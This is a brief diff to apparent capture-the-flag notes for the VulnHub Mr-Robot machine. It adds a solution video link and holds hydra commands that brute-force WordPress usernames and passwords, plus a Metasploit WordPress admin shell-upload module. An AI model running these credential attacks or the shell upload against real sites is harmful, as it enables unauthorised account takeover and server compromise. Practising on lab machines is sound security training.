@@ -1,3 +1,6 @@
+Video Solution: https://youtu.be/BUC6lZpRMxc
+Task on Vulnhub: https://www.vulnhub.com/entry/mr-robot-1,151/
+
 hydra -L fsocity.dic.uniq -p password ip http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username'
 hydra -l elliot -P fsocity.dic.uniq ip http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=is incorrect'
 use exploit/unix/webapp/wp_admin_shell_upload
